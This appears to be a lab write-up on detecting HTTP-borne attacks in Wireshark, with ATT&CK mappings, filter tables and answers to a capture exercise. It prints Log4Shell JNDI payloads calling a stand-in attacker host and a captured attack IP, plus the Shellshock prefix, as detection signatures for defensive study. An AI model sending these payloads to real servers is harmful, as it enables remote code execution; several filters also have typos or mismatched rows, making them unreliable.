HTTP Analysis
---
- HTTP (Hypertext Transfer Protocol) is a cleartext-based, request-response and client-server protocol.  
- Standard type of network activity for request/serve webpages.  
- Attack Vectors: 
	1. **Phishing pages** 
		- _T1589: Reconnaissance_ ([Gather Victim Identity Information, Technique T1589 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1589/))
			- Tactic: Gather Victim Identity Information
				- Adversaries gather email addresses or employee names to target phishing campaigns. 
		- _T1584: Resource Development_ ([Compromise Infrastructure, Technique T1584 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1584/))
			- Tactic: Acquire Infrastructure Domains
				- Adversaries may registering deceptive domains (typosquatting) to host the phishing page.
	2. **Web Attacks**
		- _T1190: Initial Access_ ([Exploit Public-Facing Application, Technique T1190 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1190/))
			- Tactic: Exploit Public-Facing Application
				- Adversaries will be motivated to leverage vulnerabilities in web servers or application to gain access
		-  _T1505.003: Persistence_ ([Server Software Component: Web Shell, Sub-technique T1505.003 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1505/003/))
			- Tactic: Server Software Component: Web 
				- Adversaries may deploy scripts (PHP, ASPX, JSP) on a web server to maintain persistent remote access
	3. **Data Exfiltration**
		- _T1041: Exfiltration_ ([Exfiltration Over C2 Channel, Technique T1041 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1041/))
			- Tactic: Exfiltration Over C2 Channel
				- Adversaries leveraging the existing HTTP/S command and control (C2) channel to steal data and blending it with C2 network traffic.
		- _T1071.001: Command and Control_ ([Application Layer Protocol, Technique T1071 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1071/))
			- Tactic: Application Layer Protocol: Web Protocol 
				- Adversaries can utilize HTTP, HTTPS, or HTTP/2/3 to communicate with external servers, making exfiltration appear as standard web browsing.  

HTTP Analysis
---

|   |   |
|---|---|
|**Notes**|**Wireshark Filter**|
|Global Search <br><br> NOTE: HTTP2 is a revision of the HTTP protocol for better performance and security. It supports binary data transfer and request & response multiplexing.|`http` <br><br> `http2` |
|**HTTP Request Methods For Grabbing Low Hanging Fruits**||
|GET|`http.request.method == "GET"`|
|POST|`http.request.method == "POST"`|
|Request: Listing all request|`http.request`|
|**HTTP Response Status Codes For Grabbing Low-Hanging Fruits**||
|200 OK: Request Successful|`http.response.code == 200`|
|301 Moving Permanently: Resource is moved to a new URL/path(permanently)|`http.response.code == 301`|
|302 Moved Temporarily: Resource is move to a new URL/path(temporarily)|`http.response.code == 302`|
|400 Bad Request: Server did not understand the request|`http.response.code == 400`|
|401 Unauthorised: URL needs authorization (login, etc)| `http.response.code == 401`|
|403 Forbidden: No access to the request URL|`http.response.code == 403`|
|404 Not Found: Server can't find the request URL|`http.response.code == 404`|
|405 Method Not Allowed: Used method is not suitable or blocked|`http.response.code == 405`|
|408 Request Timeout: Request look longer than server wait time|`http.response.code == 408`|
|500 Internal Server Error: Request not completed, unexpected error|`http.response.code == 500`|
|503 Service Unavailable: request not completed server or server is down |`http.response.code == 503`|
|**HTTP Parameters For Grabbing Low-Hanging Fruits**||
|User Agent: Browser and operating systems identification to a web server application|`http.user_agent contains "nmap"`|
|Request URL: Points the requested resource from the server|`http.request.uri contains "admin"`|
|Full URL: Complete URI information <br><br> URI: Uniform Resource Identifier.|`http.request.full_uri contains "admin"`|
|**HTTP Parameters For grabbingLowHanging Fruits**||
|Server: Server service name|`http.server contains "apache"`|
|Host: Hostname of the server|`http.host contains "keyword"`|
|Connection: Connection status|`http.host == "keyword"`|
|Line-Based Text Data: Cleartext data provided by the server|`http.connection == Keep-Alive"`|
|HTML Form URL Encoded: Web form information|`data-text-lines contains "keyword"`|

User Agent Analysis
---

- When analyzing network traffic in Wireshark, the user-agent field is a great resource for detecting anomalies.  
    

|   |   |
|---|---|
|**Notes**|**Wireshark Filter**|
|Global search| `http.user_agent`|
|**Research outcomes for grabbing the low-hanging fruits**||
|Different User_Agent Info From Same Host|`http.user-agent and ip.src =="target_ip"`|
|Non-Standard and custom User_Agent Info|`http.user_agent and not (http.user_agent contain "Mozilla" or http.user_agent contains "Opera")`|
|Subtle Spelling Differences|`http.user_agent matches (?i)Mozilla or http.user_agent matches (?i)Goggle or http.user_agent matches (?i)Windowz` |
|Audit Tools (Nmap, Nikto, Wfuzz, sqlmap)|`http.user_agent matches "(?i)sqlmap" or http.user_agent matches "(?i)Nmap" or http.user_agent matches "(?i)Wfuzz" or http.user_agent matches "(?i)Nikto" or http.user_agent matches "(?i)dirbuster" or http.user_agent matches "(?i)gobuster"`|
|Payload Data In User Agent Field|`http.user_agent contains "${" or http.user_agent contains "() {" or http.user_agent contains "/bin/bash"`|

- `"${"` <--- is a marker for the Log4shell vulnerability that affected the Java logging library, Log4j.
	- Used to trigger a JNDI "Java Naming and Directory Interface" Lookup
    - Java Naming and Directory Interface: A way for a program to find and lookup data or objects from an external source (database or server) `${jndi:ldap://attacker.com/Exploit}`
- RedFlags in JDNI lookups (attacker is attempting to perform REMOTE CODE EXECUTION "RCE" - tryig to take full control of the server by forcing it to "look up" and run their malicious codes)
	- LDAP `ldap://`: Lightweight Directory Access Protocol (Most Common in attakcs)
 	- RMI `rmi://`: Remote Method Invocation
  	- DNS `dns://`: Domain Name System
  
- `(){` or `() { :; };` Shellshock / CVE-2014-6271
	- Is a signature for the shellshock vulnerability that affects the Bash shell in Linux
 	- In a old web server the User_Agent string is passed directly into a Bash enviornment. By starting with the `() { :; };`, an adversary can force the server to execute any commands they want immediately after he brackets.
  
Log4j Analysis 
---
**Log4j**
- Is a open-source logging library written in Java.
- Allows software developers to log various data within their applications.

**Log4Shell (CVE-2021-44228)**
- vulnerability that allows Remote Code Execution (RCE).
- An attaacker can send a specially crafted string containing a JNDI "Java Naming and Directory Interface" reference such as --->`${jndi:ldap://attacker.com/Exploit}`

|	|	|
|---|---|
|**Notes**|**Wireshark**|
|Identify The Initial Attack Vector via HTTP POST Requests|`http.request.method == "POST"`|
|Search JDNI or Exploit Strings Within The IP Packet Payload|`(ip contains "jndi") or (ip contains "Exploit")`|
|Broad Search For Cleartext Exploit Patterns Within The Entire Frame|`(frame contains "jndi") or (frame contains "Exploit")`|
|Detect Suspicious User-Agent Strings With Log4j Syntax ($) or Base64 padding (==)|`(http.user_agent  contains "$") or (http.user__agent contains "==")`|

1. **Investigate the user agents. What is the number of anomalous “user-agent” types?** 
- To determine the number of user agents in the traffic, we can use the filter `http.user_agent` <--- this will filter out the user_agents only. 
- Next, we need to manually go through the packets to determine how many user agents there are in total. 
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/19b1c427871fa1e0e2a8c89a7306f41f0dfae191/SOC/Wireshark/8.%20Wireshark%20HTTP%20Cleartext%20Analysis/HTTP%20imge/87.png) 

Answer: 6  

-  Mozilla/5.0 (x=X11; Ubuntu; Linux) 
-  Mozilla/5.0 (WIndows; U; WIndows NT 6.4; en US) 
-  Wfuzz/2.4\r\n 
-  Sqlmap /1,4#stable (http://sqlmap.org)\r\n 
-  Mozilla/5.0 (compatible; nmap Scripting Engine) 
- ${jndi : ldap: //45.137.21.9:1389/Basic/Command} 
    
2. **What is the packet number with a subtle spelling difference in the user agent field?**  
- This requires us to comb through the packets to identify the spelling difference.  
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/19b1c427871fa1e0e2a8c89a7306f41f0dfae191/SOC/Wireshark/8.%20Wireshark%20HTTP%20Cleartext%20Analysis/HTTP%20imge/88.png)

3. **Locate the “Log4j” attack starting phase. What is the packet number?**
- Attacks from adversary usually starts with a POST  
- We could use the filter `http.request.method == POST`, however that will most likely generate a lot of POST traffic 
- Instead of using the POST filter we can use a user_agent filter such as `$` or `http.user_agent contains “== “` <--- this is filter for traffic with user agent that contains the dollar sign `$` which signals for command injections or double equal sign `“ == ”` which are typically at the end of a based64 encoded string.  
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/19b1c427871fa1e0e2a8c89a7306f41f0dfae191/SOC/Wireshark/8.%20Wireshark%20HTTP%20Cleartext%20Analysis/HTTP%20imge/89.png)

4. Locate the Log4j attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Defang the IP Address)
- Since we already identified the starting point in question 3, we just must decode the base64 encoded characters.  
-  We can use cyberchef or copy the base64 and save it as a file and use the ubuntu terminal to decode the base64 and save the file.
 ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/19b1c427871fa1e0e2a8c89a7306f41f0dfae191/SOC/Wireshark/8.%20Wireshark%20HTTP%20Cleartext%20Analysis/HTTP%20imge/90.png)
	Answer: 62[.]210[.]130[.]250
